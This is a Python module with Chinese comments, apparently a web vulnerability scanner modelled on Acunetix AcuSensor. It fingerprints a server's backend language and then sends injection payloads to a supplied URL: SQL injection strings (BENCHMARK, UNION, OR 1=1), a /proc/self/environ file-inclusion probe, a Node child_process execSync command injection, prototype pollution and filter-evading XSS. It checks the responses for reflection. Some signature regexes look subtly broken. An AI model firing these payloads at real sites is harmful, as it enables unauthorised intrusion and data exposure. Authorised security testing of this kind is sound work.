#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AcuSensor Language Detector & Sensor Deployer

借鉴 Acunetix AcuSensor 多语言部署概念：
检测目标服务器端语言（PHP/JAR/Node.js/.NET），并探测对应语言的传感器注入点。

核心能力：
- 服务端语言指纹识别（响应头 + Body + Cookie 模式）
- 针对各语言的特征探测参数注入
- AcuSensor JAR/PHP/Node.js/.NET 四种传感器的等效检测
"""

import re
import logging
from typing import Dict, List, Any, Optional
from urllib.parse import urlparse

logger = logging.getLogger('acusensor_lang_deploy')


# ═══════ 服务端语言指纹定义 ═══════

LANG_SIGNATURES: Dict[str, Dict[str, List[str]]] = {
    'php': {
        'headers': ['X-Powered-By.*PHP', r'Set-Cookie.*PHPSESSID'],
        'body': [r'__utm\w+', r'session_id=', r'PHP[[:space:]]+(?:SESSION|INFO)'],
        'cookies': [r'^phpsessid$', r'^wp\-login\.php$'],
    },
    'java_jar': {
        'headers': ['X-Generated-By.*Java', 'Set-Cookie.*JSESSIONID'],
        'body': [r'javax\.', r'org\.apache\.catalina', r'org\.springframework',
                  r'java\\.lang\\.Throwable'],
        'cookies': [r'^jsessionid$', r'^sessionid$'],
    },
    'node_js': {
        'headers': [r'X-Powered-By.*Express', r'Set-Cookie.*connect\.sid'],
        'body': [r'__nextData', r'process\.env\.', r'require\(.*\.js\)',
                  r'NODE_ENV', r'express[/:]'],
        'cookies': [r'^express:sess$', r'^connect\.session$'],
    },
    'dotnet': {
        'headers': [r'X-AspNet-Version', r'Set-Cookie.*ASP\.NET_SessionId',
                     r'X-AspNetMvc-Version'],
        'body': [r'__VIEWSTATE', r'__MACHTINE', r'System\.Web\.',
                  r'aspnetclient', r'Telerik\.RadControls'],
        'cookies': [r'^\.ASPXAUTH$', r'^asp\.net_sessionid$'],
    },
}

# 每种语言的特有 AcuSensor 探针参数
LANG_PROBE_PARAMS: Dict[str, Dict[str, str]] = {
    'php': {
        'acunetix_probe_php': "'; SELECT BENCHMARK(5000000, MD5('test'))--",
        'file_inclusion': '/proc/self/environ',
        'xss_reflected': '<scr<script>ipt>alert(String.fromCharCode(88))</scr<script>ipt>',
    },
    'java_jar': {
        'acunetix_probe_java': "admin' UNION SELECT 1,2,3--",
        'path_traversal': '/META-INF/context.xml',
        'xss_reflected': '<img src=x onerror=alert(1)>',
    },
    'node_js': {
        'acunetix_probe_node': "'; require('child_process').execSync('id')--",
        'prototype_pollution': '{"__proto__":{"leaked":"true"}}',
        'xss_reflected': '<svg/onload=alert(1)>',
    },
    'dotnet': {
        'acunetix_probe_dotnet': "' OR 1=1 --",
        'viewstate_probe': '/?__VIEWSTATE=',
        'xss_reflected': '<marquee onstart=alert(1)>',
    },
}


class AcuSensorLangDetector:
    """检测目标服务器端语言并生成对应传感器探针"""

    @staticmethod
    def detect_language(url: str, timeout: int = 15) -> Dict[str, Any]:
        """分析 URL 响应，判断后端语言类型。

        Returns:
            {
                'detected_languages': [...],       # ['php', 'java_jar', ...]
                'confidence_scores': {...},        # {'php': 0.95, ...}
                'primary_language': str,           # detected primary language
                'suggested_probe_params': Dict[str, str],  # probe params for detected languages
                'fingerprint_details': { ... },
            }
        """
        import requests

        result = {
            'detected_languages': [],
            'confidence_scores': {},
            'primary_language': None,
            'suggested_probe_params': {},
            'fingerprint_details': {
                'headers': {},
                'body_matches': [],
                'cookie_matches': [],
            },
        }

        try:
            resp = requests.get(url, timeout=timeout, allow_redirects=True)
        except requests.RequestException as e:
            logger.warning(f"语言检测请求失败: {e}")
            return result

        headers_text = str(resp.headers).lower()
        body_text = resp.text.lower()
        cookies = resp.cookies.get_dict()

        scores = {}

        for lang_name, sigs in LANG_SIGNATURES.items():
            score = 0.0
            total_signals = 0

            # Header signals
            for pattern in sigs['headers']:
                total_signals += 1
                if re.search(pattern, headers_text, re.IGNORECASE):
                    score += 0.4

            # Body signals
            for pattern in sigs['body']:
                total_signals += 1
                if re.search(pattern, body_text, re.IGNORECASE):
                    score += 0.35

            # Cookie signals
            for pattern in sigs['cookies']:
                total_signals += 1
                for cookie_name in cookies:
                    if re.search(pattern, cookie_name, re.IGNORECASE):
                        score += 0.25

            if score > 0.1:
                scores[lang_name] = round(min(score, 1.0), 2)

        result['confidence_scores'] = scores
        result['detected_languages'] = [k for k, v in scores.items() if v > 0.3]

        # 找出最高分语言为主语言
        if scores:
            result['primary_language'] = max(scores, key=scores.get)

        # 生成探测参数（针对每个检测到的语言）
        detected = result['detected_languages']
        for lang in detected:
            if lang in LANG_PROBE_PARAMS:
                result['suggested_probe_params'][lang] = LANG_PROBE_PARAMS[lang]

        result['fingerprint_details']['headers'] = {k: v for k, v in resp.headers.items()}
        result['fingerprint_details']['body_matches'] = [
            p for lang_sigs in LANG_SIGNATURES.values() for p in lang_sigs['body']
            if any(re.search(p, body_text) for _ in [1])
        ]

        return result

    @staticmethod
    def generate_sensor_probes(url: str, language: str = None, timeout: int = 15) -> Dict[str, Any]:
        """为指定语言生成传感器探针探测结果。

        Returns:
            {
                'language': ...,
                'probes': [{param, value, expected_response, result_status, result_matches}],
                'sensor_bypass_possible': bool,
            }
        """
        import requests

        detected = language or None

        if not detected:
            detection = AcuSensorLangDetector.detect_language(url, timeout)
            detected = detection.get('primary_language')

        result = {
            'language': detected or 'unknown',
            'probes': [],
            'sensor_bypass_possible': False,
        }

        if not detected or detected not in LANG_PROBE_PARAMS:
            return result

        probe_params = LANG_PROBE_PARAMS[detected]
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        for param_name, param_val in probe_params.items():
            test_url = f"{base_url}{parsed.path}?{param_name}={requests.utils.quote(param_val)}"
            if parsed.query:
                test_url += f"&{parsed.query}"

            try:
                resp = requests.get(test_url, timeout=timeout, allow_redirects=True)
                result['probes'].append({
                    'param': param_name,
                    'value_preview': param_val[:50],
                    'target_url': test_url,
                    'status_code': resp.status_code,
                    'body_contains_payload': param_val.lower() in resp.text.lower(),
                    'possible_bypass': resp.status_code == 200 and param_val.lower() in resp.text.lower(),
                })
            except requests.RequestException as e:
                result['probes'].append({
                    'param': param_name,
                    'status_code': None,
                    'error': str(e),
                })

        # 绕过可能性评估
        bypass_count = sum(1 for p in result['probes'] if p.get('possible_bypass'))
        total = len(result['probes'])
        result['sensor_bypass_possible'] = (total > 0 and bypass_count / total >= 0.5)

        return result


def detect_server_language(url: str, timeout: int = 15) -> Dict[str, Any]:
    """快速检测服务器端语言（便捷函数）"""
    return AcuSensorLangDetector.detect_language(url, timeout)


def generate_sensor_probes_for_url(url: str, language: str = None, timeout: int = 15) -> Dict[str, Any]:
    """为 URL 生成传感器探针（便捷函数）"""
    return AcuSensorLangDetector.generate_sensor_probes(url, language, timeout)
